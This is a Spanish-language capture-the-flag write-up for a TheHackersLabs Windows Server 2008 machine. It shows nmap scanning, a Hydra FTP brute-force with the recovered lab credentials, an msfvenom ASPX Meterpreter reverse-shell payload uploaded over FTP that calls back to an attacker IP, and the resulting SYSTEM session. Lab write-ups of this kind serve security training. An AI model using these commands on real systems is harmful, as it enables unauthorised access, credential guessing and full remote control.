# Writeup — Cocido Andaluz (TheHackersLabs)

**Plataforma:** TheHackersLabs  
**Sistema:** Windows Server 2008 SP1 x86 (Build 6001)  
**IP:** 10.10.10.19  
**Objetivo:** Obtener user.txt y root.txt

---

## 1. Reconocimiento de la red

```bash
sudo netdiscover -i eth0 -r 10.10.10.0/24
```

Se identifica la víctima en `10.10.10.19` (MAC Oracle VirtualBox).

---

## 2. Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.10.10.19 -oG all_ports.txt
nmap -p21,80,135,139,445,49152,49153,49154,49155,49156,49157,49158 -sCV -vvv 10.10.10.19 -oN tcp_scan.txt
```

**Puertos abiertos relevantes:**

| Puerto | Servicio |
|--------|----------|
| 21/tcp | FTP (Microsoft ftpd) |
| 80/tcp | HTTP (IIS 7.0 / Apache 2.2.16 Debian) |
| 135/tcp | MSRPC |
| 139/tcp | NetBIOS |
| 445/tcp | SMB |
| 49152-49158 | MSRPC |

---

## 3. Enumeración de servicios

### FTP (puerto 21)
- Anonymous login: **denegado**
- Fuerza bruta con Hydra encuentra credenciales:

```bash
hydra -L /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -P /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords.txt -t 20 ftp://10.10.10.19
```

**Usuario:** `info`
**Contraseña:** `PolniyPizdec0211`

### HTTP (puerto 80)
- Gobuster/Dirb/Feroxbuster solo revelan:
  - `/index.html` — Apache2 Debian Default Page
  - `/aspnet_client/` — directorio ASP.NET
  - `/icons/` — iconos Apache
- Whatweb detecta IIS 7.0 con X-Powered-By: ASP.NET (posiblemente un WAF o reverse proxy engañoso)

### SMB (puerto 445)
- Null session permitida pero sin acceso a shares.
- Windows 6.0 Build 6001, SMB signing deshabilitado.

### RPC (puerto 135)
- Acceso denegado a samr/srvsvc.

---

## 4. Explotación — Acceso inicial

### Subida de shell vía FTP

Con las credenciales `info:PolniyPizdec0211` se accede al FTP.

Se genera un payload ASPX de Meterpreter:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.10.3 LPORT=4444 -f aspx -o reverse.aspx
```

Se sube al servidor:

```bash
ftp info@10.10.10.19
put reverse.aspx
```

### Ejecución del payload

Se accede a `http://10.10.10.19/reverse.aspx` desde el navegador mientras Msfconsole escucha con `multi/handler`:

```bash
msfconsole
use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 10.10.10.3
set LPORT 4444
run
```

Se obtiene sesión como `NT AUTHORITY\Servicio de red`.

---

## 5. Escalada de privilegios

El usuario `Servicio de red` ya cuenta con privilegios elevados:

```
meterpreter > getuid
NT AUTHORITY\Servicio de red

meterpreter > getsystem
Already running as SYSTEM

meterpreter > getprivs
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```

**Ya somos SYSTEM directamente**, sin necesidad de exploit adicional.

---

## 6. Captura de flags

```cmd
c:\Users\Administrador\Desktop> type root.txt
<REDACTED>

c:\Users\info> type user.txt
<REDACTED>
```

---

## Flags

| Flag | Valor |
|------|-------|
| **user.txt** | `<REDACTED>` |
| **root.txt** | `<REDACTED>` |

---

## Resumen

1. **Reconocimiento:** netdiscover + nmap identifican el target.
2. **Enumeración:** FTP, SMB, HTTP sin resultados directos.
3. **Fuerza bruta:** Hydra encuentra creds FTP: `info:PolniyPizdec0211`.
4. **Explotación:** Subida de shell ASPX vía FTP → ejecución → sesión Meterpreter.
5. **Escalada:** La sesión ya corre como SYSTEM (SeImpersonate disponible).
6. **Flags:** Captura de `user.txt` y `root.txt`.
